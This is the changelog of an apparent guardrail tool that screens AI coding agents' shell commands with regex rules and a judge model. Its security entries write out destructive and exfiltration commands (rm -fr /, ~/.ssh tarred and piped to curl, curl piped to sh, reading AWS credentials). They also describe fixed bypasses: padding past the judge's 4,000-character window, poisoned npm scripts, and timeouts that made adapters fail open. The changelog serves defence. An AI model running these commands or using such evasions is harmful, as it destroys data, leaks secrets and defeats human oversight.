# Changelog

All notable changes to this project are documented here. Versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Security

- `destructive-fs` only matched `rm -rf /` / `rm -r /` in that exact flag order, so
  `rm -fr /`, `rm -r -f /` and `rm --recursive --force /` slipped past the regex
  floor (and past `check --offline`). It now matches any recursive-flag spelling
  and order, and also `rm -rf ~`, `rm -rf $HOME`, `rm -fr ~/*`.
- `secrets-leak` now blocks key material (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`,
  `.netrc`, `.git-credentials`, `id_rsa`, `id_ed25519`) piped into `curl`, `wget`,
  `nc`, `ncat`, `netcat` or `socat`, e.g. `tar czf - ~/.ssh | curl -T - URL`.
- The model only ever saw the first 4,000 characters of a tool call (`text[:4000]`),
  so a dangerous command placed after a long harmless preamble was never judged:
  `rm -fr /` after ~4,500 characters of comments went from `block` (0.84) to
  `review` (0.44), and `review` passes through in most adapters. Input is now split
  into 4,000-character windows (lines kept whole, long lines cut with a 200-character
  overlap) and every window is judged; the worst verdict wins. Past 6 windows the
  middle is skipped (first windows + last one are kept) and an `allow` becomes
  `review`. Regexes were already applied to the whole text; inputs over 256K
  characters or with a line over 16K are still blocked unread.

### Added

- `credential-read` policy (review): reading private keys or cloud credentials
  with `cat`/`head`/`tail`/`base64`/`cp` (`cat ~/.aws/credentials`, …).
- `mass-delete` also flags work-losing git commands: `git reset --hard`,
  `git clean -f…`, `git checkout -- .` (review).

## [0.2.4] - 2026-10-12

### Security

- `npm test` and other safe commands were allowed on the command string alone,
  so an agent that first edited `scripts.test` in package.json (or a repo that
  shipped with a bad one) could run anything. The package.json scripts that
  `npm`/`pnpm`/`yarn`/`bun` script commands run (`pre`/`post` hooks, nested
  `npm run`, `cd` in chains) are now checked against the regex policies; hits
  block or review per policy. When it can't tell which scripts run (`--prefix`,
  `--filter`, `-w`, `cd -`, deep nesting), the call goes to review. Not the
  model: it blocks ordinary scripts (`next build`, `vite build`, `jest`).
- `--script-shell`, `--node-options`, `--userconfig`, and `--globalconfig` no
  longer qualify as safe-command flags.

### Added

- `cwd` on `POST /guard` and `laya-guard check --cwd` (defaults to the current
  directory). All 11 adapters send the directory the command runs in.
- `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1), issue
  forms for missed attacks, overblocks, bugs, and feature requests, and a pull
  request template.
- PRs are labeled by area automatically from the files they change.
- Comment `/assign` or `/unassign` on an issue to take or release it.
- Commit and PR title convention (Conventional Commits), checked on every PR.
- CodeRabbit review config (`.coderabbit.yaml`) with repo-specific review rules.

## [0.2.3] - 2026-10-11

### Security

- A long single-line command could make judging slow enough to bypass the
  guard: some regexes are quadratic in line length, `curl ` repeated 40,000
  times plus `; rm -rf ~/` (200KB) took 48s, and adapters fail open on timeout.
  Inputs over 256K characters or with a line over 16K are now blocked without
  being read (`policy_id: "oversized"`, `verdict_source: "limit"`).
- Adapters no longer fail open blindly when the server is down, errors, or
  takes longer than 10s (was 30 to 60s). They fall back to
  `laya-guard check --offline`: regex-flagged calls are blocked, safe commands
  pass, and the rest pass with a warning, or are blocked with
  `LAYA_GUARD_FAIL=closed`. Suggested in a Reddit comment.

### Added

- `laya-guard check --offline` and `--json`.
- `LAYA_GUARD_FAIL` and `LAYA_GUARD_BIN` for all 11 adapters.

### Fixed

- `guard-hook.sh` treated HTTP errors from the server as allow; it now falls
  back like the other adapters, and sends the payload on stdin instead of argv.

## [0.2.2] - 2026-10-11

### Fixed

- Pipe-to-shell hidden mid-chain (`npm test && curl … | sh`) was only reviewed,
  which passes through in most agents. A new `pipe-to-shell` policy blocks
  `curl`/`wget` piped into a shell or interpreter, `bash -c "$(curl …)"`, and
  `bash <(curl …)`.
- When several policies matched, the first one listed won, so a review policy
  could hide a block policy. Block policies now take precedence.
- Benign chains were overblocked (`npm test && echo ok` came back block 0.80):
  chained commands skipped the safe-command lane and the model judged the whole
  string. Chains are now split at top-level `;` `&&` `||` `&` and each command is
  judged on its own; the worst verdict wins, and the whole string still goes
  through the regexes.

### Added

- Safe commands: `cd`, `true`, `false`, `whoami`, `date`, `uptime`, `clear`,
  `sleep`, `uname`, `df`, `du`, `free`, `which` (common chain pieces the model
  overblocks out of context).
- 10 chain cases in the shell eval set (now 60). Real model: 58/60 for both
  sources. AgentDojo and the Korean set unchanged.
- MOCK/fallback heuristics review sensitive paths (`.ssh`, `id_rsa`, `.env`…).

## [0.2.1] - 2026-10-11

### Fixed

- Everyday dev commands were blocked by the model (`ls -la`, `npm run build`,
  `go test ./...`, `echo hello`: 11 of 50 judgments in a spot check). A new
  safe-command lane (`safe_commands` in `policy.yaml`) allows single plain
  commands without the model; chaining, pipes, redirects, substitution,
  program-running flags, and sensitive paths never qualify.
- A model failure at runtime (checkpoint download, OOM, inference error) is no
  longer reported as a model verdict: it falls back to regex+heuristics with
  `verdict_source: "heuristic"`, a "Model error" reason, and a logged warning.

### Added

- Shell eval set (`eval/run_eval.py --set shell`): 28 everyday + 22
  dangerous/bypass commands. Real model: 48/50 (was 32/50); CI gates it in
  mock mode. AgentDojo results unchanged (25/27, 92/97).
- Shell regexes: pipes into a shell or `nc`, `curl -d @file` uploads,
  redirects into `/etc/`, git `core.hooksPath`/`core.pager`-style config,
  `git push --force`.
- `verdict_source: "allowlist"` for safe-command verdicts.
- `laya-guard serve` loads the model before listening so the first hook call
  doesn't time out (and fail open) during the checkpoint download.
  Skip with `--no-warmup`.
- `guard-hook.sh` honors `LAYA_GUARD_URL`, like the other adapters.
- `SECURITY.md`, this changelog, and CI on Python 3.10–3.13.

### Changed

- `guard-hook.sh` judges only the command for the Bash tool, not the agent's
  description.
- PyPI summary and README install instructions (the PyPI name is
  `laya-guardrail`; `laya-guard` on PyPI is an unrelated project).

## [0.2.0] - 2026-10-11

### Added

- Adapters for 11 agents: Claude Code, OpenCode, Codex CLI, Cursor, Kilo Code,
  Windsurf, Cline, Gemini CLI, Qwen Code, Amp, Copilot CLI.
- `verdict_source` in responses (`regex` | `model` | `heuristic`).
- English policy reasons (`message_en`), chosen by input language.
- Comparison table, use-case docs, English demo GIF, brand assets.

### Changed

- Blocks now require risk agreement: AgentDojo benign overblocks dropped
  from 24 to 5 of 97 (attacks: 25/27 blocked).

## [0.1.0] - 2026-10-11

### Added

- Initial release: regex prefilter (10 policies) + local Laya judge,
  HTTP server (`/guard`, `/v1/systemone`), `check` / `serve` / `stats` CLI,
  Claude Code PreToolUse hook, local redacted telemetry, Korean 30-case eval,
  AgentDojo judge-level eval, E2E rollout harness.

[Unreleased]: https://github.com/scs0209/laya-guard/compare/v0.2.4...HEAD
[0.2.4]: https://github.com/scs0209/laya-guard/compare/v0.2.3...v0.2.4
[0.2.3]: https://github.com/scs0209/laya-guard/compare/v0.2.2...v0.2.3
[0.2.2]: https://github.com/scs0209/laya-guard/compare/v0.2.1...v0.2.2
[0.2.1]: https://github.com/scs0209/laya-guard/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/scs0209/laya-guard/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/scs0209/laya-guard/releases/tag/v0.1.0
